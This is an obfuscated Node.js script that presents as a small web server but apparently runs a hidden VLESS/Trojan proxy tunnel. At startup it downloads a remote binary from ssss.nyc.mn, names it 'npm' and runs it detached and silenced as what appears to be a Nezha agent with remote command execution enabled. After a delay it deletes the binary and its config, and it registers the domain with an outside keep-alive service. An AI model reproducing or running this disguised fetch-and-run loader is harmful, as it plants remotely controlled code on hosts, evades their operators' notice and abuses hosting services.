const _0x3fae=['data','readUInt16BE','NAME','https://oooo.serv00.net/add-url','trojan://','text/plain','catch','includes','npm\x20download\x20successfully','close','&type=A','text/html','crypto','reduce',':443?security=tls&sni=','Hello\x20world!','length','config.yaml','&path=%2F','error','url','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','https://api.ip.sb/geoip','post','npm\x20is\x20running','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','map','slice','NEZHA_KEY','Answer','vless://','createServer','AUTO_ACCESS','child_process','decode','every','https://','join','application/json','arm64','stream','Status','createHash','env',':443?encryption=none&security=tls&sni=','unlink','pipe','SUB_PATH','readFile','1234.abc.com','application/dns-json','connect','NEZHA_PORT','update','concat','false','createWriteStream','https://dns.google/resolve?name=','aarch64','pop','8443','https://arm64.ssss.nyc.mn/v1','\x20with\x20all\x20DNS\x20servers','isp','log','replace','writeHead','npm\x20is\x20already\x20running,\x20skip\x20running...','write','readUInt8','axios','sha224','find','from','NEZHA_SERVER','split','send','then','UUID','toString','2083'];const _0x3b09=function(_0x3fae75,_0x3b0985){_0x3fae75=_0x3fae75-0x0;let _0x422e8e=_0x3fae[_0x3fae75];return _0x422e8e;};const os=require('os');const http=require('http');const fs=require('fs');const axios=require(_0x3b09('0x46'));const net=require('net');const path=require('path');const crypto=require(_0x3b09('0xc'));const {Buffer}=require('buffer');const {exec,execSync}=require(_0x3b09('0x21'));const {WebSocket,createWebSocketStream}=require('ws');const UUID=process[_0x3b09('0x2b')][_0x3b09('0x4e')]||'95c13c09-e853-4cd9-9eeb-a160348af3f8';const NEZHA_SERVER=process[_0x3b09('0x2b')][_0x3b09('0x4a')]||'';const NEZHA_PORT=process[_0x3b09('0x2b')][_0x3b09('0x34')]||'';const NEZHA_KEY=process['env'][_0x3b09('0x1c')]||'';const DOMAIN=process[_0x3b09('0x2b')]['DOMAIN']||_0x3b09('0x31');const AUTO_ACCESS=process['env'][_0x3b09('0x20')]||!![];const WSPATH=process['env']['WSPATH']||UUID['slice'](0x0,0x8);const SUB_PATH=process['env'][_0x3b09('0x2f')]||'sub';const NAME=process['env'][_0x3b09('0x2')]||'';const PORT=process[_0x3b09('0x2b')]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{try{const _0x1cc83f=await axios['get'](_0x3b09('0x16'));const _0x10635e=_0x1cc83f[_0x3b09('0x0')];ISP=(_0x10635e['country_code']+'-'+_0x10635e[_0x3b09('0x3f')])['replace'](/ /g,'_');}catch(_0x46cb01){ISP='Unknown';}};GetISP();const httpServer=http[_0x3b09('0x1f')]((_0x26cba4,_0xea17b6)=>{if(_0x26cba4[_0x3b09('0x14')]==='/'){const _0x245b8a=path[_0x3b09('0x25')](__dirname,'index.html');fs[_0x3b09('0x30')](_0x245b8a,'utf8',(_0x2cd8c3,_0x336a2c)=>{if(_0x2cd8c3){_0xea17b6['writeHead'](0xc8,{'Content-Type':'text/html'});_0xea17b6['end'](_0x3b09('0xf'));return;}_0xea17b6[_0x3b09('0x42')](0xc8,{'Content-Type':_0x3b09('0xb')});_0xea17b6['end'](_0x336a2c);});return;}else if(_0x26cba4['url']==='/'+SUB_PATH){const _0x548096=NAME?NAME+'-'+ISP:ISP;const _0x241d98=_0x3b09('0x1e')+UUID+'@'+DOMAIN+_0x3b09('0x2c')+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x3b09('0x12')+WSPATH+'#'+_0x548096;const _0x3d3c22=_0x3b09('0x4')+UUID+'@'+DOMAIN+_0x3b09('0xe')+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x548096;const _0x3da695=_0x241d98+'\x0a'+_0x3d3c22;const _0x5e7476=Buffer[_0x3b09('0x49')](_0x3da695)[_0x3b09('0x4f')]('base64');_0xea17b6['writeHead'](0xc8,{'Content-Type':_0x3b09('0x5')});_0xea17b6['end'](_0x5e7476+'\x0a');}else{_0xea17b6[_0x3b09('0x42')](0x194,{'Content-Type':_0x3b09('0x5')});_0xea17b6['end']('Not\x20Found\x0a');}});const wss=new WebSocket['Server']({'server':httpServer});const uuid=UUID[_0x3b09('0x41')](/-/g,'');const DNS_SERVERS=['8.8.4.4','1.1.1.1'];function resolveHost(_0x25adbe){return new Promise((_0x3a4e6e,_0x16bbf9)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x25adbe)){_0x3a4e6e(_0x25adbe);return;}let _0x4497e6=0x0;function _0x49eefd(){if(_0x4497e6>=DNS_SERVERS['length']){_0x16bbf9(new Error('Failed\x20to\x20resolve\x20'+_0x25adbe+_0x3b09('0x3e')));return;}const _0x2a7455=DNS_SERVERS[_0x4497e6];_0x4497e6++;const _0x367d11=_0x3b09('0x39')+encodeURIComponent(_0x25adbe)+_0x3b09('0xa');axios['get'](_0x367d11,{'timeout':0x1388,'headers':{'Accept':_0x3b09('0x32')}})[_0x3b09('0x4d')](_0x131f4b=>{const _0x1ef83b=_0x131f4b[_0x3b09('0x0')];if(_0x1ef83b[_0x3b09('0x29')]===0x0&&_0x1ef83b['Answer']&&_0x1ef83b[_0x3b09('0x1d')]['length']>0x0){const _0x1ffa56=_0x1ef83b[_0x3b09('0x1d')][_0x3b09('0x48')](_0x18ef62=>_0x18ef62['type']===0x1);if(_0x1ffa56){_0x3a4e6e(_0x1ffa56[_0x3b09('0x0')]);return;}}_0x49eefd();})[_0x3b09('0x6')](_0x5d5f21=>{_0x49eefd();});}_0x49eefd();});}function handleVlessConnection(_0x25679f,_0x5c1b42){const [_0x4b60bf]=_0x5c1b42;const _0x1269a7=_0x5c1b42['slice'](0x1,0x11);if(!_0x1269a7[_0x3b09('0x23')]((_0x2eefe7,_0x3d152c)=>_0x2eefe7==parseInt(uuid['substr'](_0x3d152c*0x2,0x2),0x10)))return![];let _0x1de42b=_0x5c1b42['slice'](0x11,0x12)[_0x3b09('0x45')]()+0x13;const _0x22dc0f=_0x5c1b42['slice'](_0x1de42b,_0x1de42b+=0x2)['readUInt16BE'](0x0);const _0x39e7f4=_0x5c1b42[_0x3b09('0x1b')](_0x1de42b,_0x1de42b+=0x1)[_0x3b09('0x45')]();const _0x48580c=_0x39e7f4==0x1?_0x5c1b42[_0x3b09('0x1b')](_0x1de42b,_0x1de42b+=0x4)[_0x3b09('0x25')]('.'):_0x39e7f4==0x2?new TextDecoder()[_0x3b09('0x22')](_0x5c1b42['slice'](_0x1de42b+0x1,_0x1de42b+=0x1+_0x5c1b42[_0x3b09('0x1b')](_0x1de42b,_0x1de42b+0x1)['readUInt8']())):_0x39e7f4==0x3?_0x5c1b42[_0x3b09('0x1b')](_0x1de42b,_0x1de42b+=0x10)[_0x3b09('0xd')]((_0x5400c1,_0x4647d8,_0x4759e6,_0x30185c)=>_0x4759e6%0x2?_0x5400c1[_0x3b09('0x36')](_0x30185c['slice'](_0x4759e6-0x1,_0x4759e6+0x1)):_0x5400c1,[])['map'](_0x60a8c2=>_0x60a8c2[_0x3b09('0x1')](0x0)['toString'](0x10))[_0x3b09('0x25')](':'):'';_0x25679f[_0x3b09('0x4c')](new Uint8Array([_0x4b60bf,0x0]));const _0x416426=createWebSocketStream(_0x25679f);resolveHost(_0x48580c)[_0x3b09('0x4d')](_0x38f8ac=>{net['connect']({'host':_0x38f8ac,'port':_0x22dc0f},function(){this[_0x3b09('0x44')](_0x5c1b42['slice'](_0x1de42b));_0x416426['on']('error',()=>{})[_0x3b09('0x2e')](this)['on'](_0x3b09('0x13'),()=>{})['pipe'](_0x416426);})['on']('error',()=>{});})[_0x3b09('0x6')](_0x350bce=>{net[_0x3b09('0x33')]({'host':_0x48580c,'port':_0x22dc0f},function(){this['write'](_0x5c1b42['slice'](_0x1de42b));_0x416426['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](_0x416426);})['on'](_0x3b09('0x13'),()=>{});});return!![];}function handleTrojanConnection(_0xe61fc4,_0x48654c){try{if(_0x48654c['length']<0x3a)return![];const _0x210295=_0x48654c['slice'](0x0,0x38)[_0x3b09('0x4f')]();const _0xfb5617=[UUID];let _0x412220=null;for(const _0x2d3f3e of _0xfb5617){const _0x34e360=crypto[_0x3b09('0x2a')](_0x3b09('0x47'))[_0x3b09('0x35')](_0x2d3f3e)['digest']('hex');if(_0x34e360===_0x210295){_0x412220=_0x2d3f3e;break;}}if(!_0x412220)return![];let _0x17e775=0x38;if(_0x48654c[_0x17e775]===0xd&&_0x48654c[_0x17e775+0x1]===0xa){_0x17e775+=0x2;}const _0x4040b3=_0x48654c[_0x17e775];if(_0x4040b3!==0x1)return![];_0x17e775+=0x1;const _0x39ab30=_0x48654c[_0x17e775];_0x17e775+=0x1;let _0x7e4f3a,_0x7fd4e7;if(_0x39ab30===0x1){_0x7e4f3a=_0x48654c[_0x3b09('0x1b')](_0x17e775,_0x17e775+0x4)[_0x3b09('0x25')]('.');_0x17e775+=0x4;}else if(_0x39ab30===0x3){const _0xbc2a2e=_0x48654c[_0x17e775];_0x17e775+=0x1;_0x7e4f3a=_0x48654c[_0x3b09('0x1b')](_0x17e775,_0x17e775+_0xbc2a2e)[_0x3b09('0x4f')]();_0x17e775+=_0xbc2a2e;}else if(_0x39ab30===0x4){_0x7e4f3a=_0x48654c['slice'](_0x17e775,_0x17e775+0x10)['reduce']((_0x4022f4,_0x5eeee9,_0x2f8806,_0x3a0d42)=>_0x2f8806%0x2?_0x4022f4['concat'](_0x3a0d42[_0x3b09('0x1b')](_0x2f8806-0x1,_0x2f8806+0x1)):_0x4022f4,[])[_0x3b09('0x1a')](_0x2b2633=>_0x2b2633['readUInt16BE'](0x0)[_0x3b09('0x4f')](0x10))[_0x3b09('0x25')](':');_0x17e775+=0x10;}else{return![];}_0x7fd4e7=_0x48654c['readUInt16BE'](_0x17e775);_0x17e775+=0x2;if(_0x17e775<_0x48654c[_0x3b09('0x10')]&&_0x48654c[_0x17e775]===0xd&&_0x48654c[_0x17e775+0x1]===0xa){_0x17e775+=0x2;}const _0x22910e=createWebSocketStream(_0xe61fc4);resolveHost(_0x7e4f3a)['then'](_0x502a13=>{net['connect']({'host':_0x502a13,'port':_0x7fd4e7},function(){if(_0x17e775<_0x48654c['length']){this[_0x3b09('0x44')](_0x48654c['slice'](_0x17e775));}_0x22910e['on'](_0x3b09('0x13'),()=>{})[_0x3b09('0x2e')](this)['on']('error',()=>{})[_0x3b09('0x2e')](_0x22910e);})['on']('error',()=>{});})['catch'](_0x1a0c70=>{net['connect']({'host':_0x7e4f3a,'port':_0x7fd4e7},function(){if(_0x17e775<_0x48654c['length']){this['write'](_0x48654c['slice'](_0x17e775));}_0x22910e['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})[_0x3b09('0x2e')](_0x22910e);})['on']('error',()=>{});});return!![];}catch(_0x27fdf3){return![];}}wss['on']('connection',(_0x4e9449,_0x1fca4d)=>{const _0x1331dd=_0x1fca4d['url']||'';_0x4e9449['once']('message',_0x493b8a=>{if(_0x493b8a[_0x3b09('0x10')]>0x11&&_0x493b8a[0x0]===0x0){const _0x1f2110=_0x493b8a[_0x3b09('0x1b')](0x1,0x11);const _0x5762e2=_0x1f2110[_0x3b09('0x23')]((_0x2c0716,_0x34bce8)=>_0x2c0716==parseInt(uuid['substr'](_0x34bce8*0x2,0x2),0x10));if(_0x5762e2){if(!handleVlessConnection(_0x4e9449,_0x493b8a)){_0x4e9449['close']();}return;}}if(!handleTrojanConnection(_0x4e9449,_0x493b8a)){_0x4e9449[_0x3b09('0x9')]();}})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x2ad11b=os['arch']();if(_0x2ad11b==='arm'||_0x2ad11b===_0x3b09('0x27')||_0x2ad11b===_0x3b09('0x3a')){if(!NEZHA_PORT){return _0x3b09('0x3d');}else{return'https://arm64.ssss.nyc.mn/agent';}}else{if(!NEZHA_PORT){return'https://amd64.ssss.nyc.mn/v1';}else{return'https://amd64.ssss.nyc.mn/agent';}}};const downloadFile=async()=>{if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x2bcef1=getDownloadUrl();const _0x5b64c8=await axios({'method':'get','url':_0x2bcef1,'responseType':_0x3b09('0x28')});const _0x5a5f45=fs[_0x3b09('0x38')]('npm');_0x5b64c8['data'][_0x3b09('0x2e')](_0x5a5f45);return new Promise((_0x35c13a,_0x2ad7ea)=>{_0x5a5f45['on']('finish',()=>{console['log'](_0x3b09('0x8'));exec('chmod\x20+x\x20npm',_0x37fefb=>{if(_0x37fefb)_0x2ad7ea(_0x37fefb);_0x35c13a();});});_0x5a5f45['on']('error',_0x2ad7ea);});}catch(_0xcee270){throw _0xcee270;}};const runnz=async()=>{try{const _0x471a45=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':'utf-8'});if(_0x471a45['trim']()!==''){console[_0x3b09('0x40')](_0x3b09('0x43'));return;}}catch(_0x9d4898){}await downloadFile();let _0x13c589='';let _0x12acb1=['443',_0x3b09('0x3c'),'2096','2087',_0x3b09('0x50'),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x152b2b=_0x12acb1[_0x3b09('0x7')](NEZHA_PORT)?'--tls':'';_0x13c589='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x152b2b+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1e77f2=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x3b09('0x4b')](':')[_0x3b09('0x3b')]():'';const _0x2e5c97=_0x12acb1['includes'](_0x1e77f2)?'true':_0x3b09('0x37');const _0xde757a='client_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x3b09('0x15')+_0x2e5c97+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync']('config.yaml',_0xde757a);}_0x13c589='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console['log'](_0x3b09('0x19'));return;}try{exec(_0x13c589,{'shell':'/bin/bash'},_0x2aa55a=>{if(_0x2aa55a)console['error']('npm\x20running\x20error:',_0x2aa55a);else console[_0x3b09('0x40')](_0x3b09('0x18'));});}catch(_0x37d836){console[_0x3b09('0x13')]('error:\x20'+_0x37d836);}};async function addAccessTask(){if(!AUTO_ACCESS)return;if(!DOMAIN){return;}const _0x446894=_0x3b09('0x24')+DOMAIN;try{const _0x4dc7c7=await axios[_0x3b09('0x17')](_0x3b09('0x3'),{'url':_0x446894},{'headers':{'Content-Type':_0x3b09('0x26')}});console['log']('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x1820a7){}}const delFiles=()=>{fs[_0x3b09('0x2d')]('npm',()=>{});fs['unlink'](_0x3b09('0x11'),()=>{});};httpServer['listen'](PORT,()=>{runnz();setTimeout(()=>{delFiles();},0x2bf20);addAccessTask();console['log']('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
